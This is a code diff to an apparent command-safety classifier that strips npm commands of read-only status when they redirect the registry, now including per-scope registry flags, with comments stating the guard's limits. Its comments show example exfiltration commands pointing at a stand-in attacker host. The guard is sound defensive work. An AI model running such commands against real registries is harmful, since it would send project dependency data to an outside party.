@@ -252,17 +252,35 @@ const NPM_READ_ONLY_SUBS: ReadonlySet<string> = new Set([
  * floored npm subcommand forfeits the read-only classification: `npm
  * audit --registry=http://attacker` would submit the full dependency
  * manifest to the named host, which is exfiltration, not a safe read.
- * Matches both the glued (`--registry=URL`) and separate (`--registry
- * URL`) forms; npm has no short-flag spelling for any of these three.
+ * Matches the glued (`--registry=URL`) and separate (`--registry URL`)
+ * unscoped forms, and the PER-SCOPE registry override
+ * (`--@scope:registry=URL` / `--@scope:registry URL`, e.g.
+ * `--@myorg:registry=http://attacker`) via `NPM_REGISTRY_FLAG_RE` — npm
+ * resolves a scoped package's registry from `@scope:registry` before the
+ * plain `registry` config, so the scoped form is an equally live
+ * exfiltration vector, not merely a naming variant. `--userconfig` /
+ * `--globalconfig` have no per-scope form; npm has no short-flag spelling
+ * for any of these three.
+ *
+ * HONEST LIMIT: this is a CLI-token guard only. It cannot see (and does
+ * not attempt to close) `registry` set via `.npmrc` (project, user, or
+ * global) or the `npm_config_registry` environment variable — both
+ * redirect npm's registry lookups identically to `--registry` but leave
+ * no trace in the argv this classifier inspects. Do not read this guard
+ * as "npm's registry source is verified"; it only denies the on-the-spot
+ * CLI override.
  */
-const NPM_UNTRUSTED_SOURCE_FLAGS: ReadonlySet<string> = new Set([
-  "--registry", "--userconfig", "--globalconfig",
+const NPM_REGISTRY_FLAG_RE = /^--(@[^:]+:)?registry(=|$)/;
+const NPM_UNSCOPED_UNTRUSTED_FLAGS: ReadonlySet<string> = new Set([
+  "--userconfig", "--globalconfig",
 ]);
 
 function hasNpmUntrustedSourceFlag(tokens: readonly string[]): boolean {
   return tokens.some(
-    (t) => NPM_UNTRUSTED_SOURCE_FLAGS.has(t) ||
-      [...NPM_UNTRUSTED_SOURCE_FLAGS].some((f) => t.startsWith(`${f}=`)),
+    (t) =>
+      NPM_REGISTRY_FLAG_RE.test(t) ||
+      NPM_UNSCOPED_UNTRUSTED_FLAGS.has(t) ||
+      [...NPM_UNSCOPED_UNTRUSTED_FLAGS].some((f) => t.startsWith(`${f}=`)),
   );
 }
 
@@ -535,10 +553,13 @@ function classifyTokens(tokens: readonly string[]): boolean {
   if (bin === "harness") return HARNESS_READ_ONLY_SUBS.has(sub);
 
   if (bin === "npm") {
-    // `--registry` / `--userconfig` / `--globalconfig` redirect npm's
-    // network or config lookups to an operator-unverified location; forfeit
-    // the read-only classification for the whole npm invocation regardless
-    // of which subcommand is used. See `NPM_UNTRUSTED_SOURCE_FLAGS`.
+    // `--registry` (incl. the per-scope `--@scope:registry` form) /
+    // `--userconfig` / `--globalconfig` redirect npm's network or config
+    // lookups to an operator-unverified location; forfeit the read-only
+    // classification for the whole npm invocation regardless of which
+    // subcommand is used. See `NPM_REGISTRY_FLAG_RE` / `NPM_UNSCOPED_UNTRUSTED_FLAGS`
+    // (and their docstring's stated limit — this is a CLI-token guard only,
+    // it cannot see `.npmrc` or `npm_config_registry`).
     if (hasNpmUntrustedSourceFlag(tokens.slice(1))) return false;
 
     // `npm audit` (report) is read-only; `npm audit fix` mutates the
@@ -553,8 +574,16 @@ function classifyTokens(tokens: readonly string[]): boolean {
     // `signatures` (npm's other read-only audit arm); any other positional
     // token — quoted, glued, or a future subcommand this floor has not
     // reasoned about — forfeits the classification. This also fails closed
-    // on `npm audit --audit-level high` (the separated value `high` is a
-    // positional token), an acceptable, conservative false negative.
+    // on ANY separated flag value (e.g. `npm audit --audit-level high`,
+    // `npm audit --omit dev` — the value itself, `high` / `dev`, is a
+    // positional token with no leading `-`), an acceptable, conservative
+    // false negative; use the glued `--flag=value` form to stay floored.
+    // Deliberately NOT blocked: `npm audit -fix` (single dash). Verified
+    // npm 11.17.0 behavior: npm's arg parser does not recognize `-fix` as
+    // the `fix` subcommand or as any known flag cluster — it errors
+    // `Unknown cli config "--fix"` and falls back to the plain (read-only)
+    // report. `startsWith("-")` correctly floors it; do not "fix" this into
+    // a block without re-verifying npm's parser first.
     if (sub === "audit") {
       return tokens.slice(2).every((t) => t.startsWith("-") || t === "signatures");
     }
